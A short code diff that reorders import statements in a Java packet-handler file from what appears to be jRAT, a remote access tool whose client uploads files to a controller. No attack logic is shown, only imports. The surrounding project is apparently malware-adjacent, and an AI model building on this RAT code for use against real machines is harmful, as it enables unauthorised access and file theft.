@@ -1,13 +1,13 @@
 package jrat.client.packets.incoming;
 
-import jrat.common.TransferRunnable;
-import jrat.common.io.FileCache;
-import jrat.common.io.TransferData;
 import jrat.client.Connection;
 import jrat.client.packets.outgoing.AbstractOutgoingPacket;
 import jrat.client.packets.outgoing.Packet29ClientUploadPart;
 import jrat.client.packets.outgoing.Packet30BeginClientUpload;
 import jrat.client.packets.outgoing.Packet31CompleteClientUpload;
+import jrat.common.TransferRunnable;
+import jrat.common.io.FileCache;
+import jrat.common.io.TransferData;
 
 import java.io.File;
 import java.io.FileInputStream;
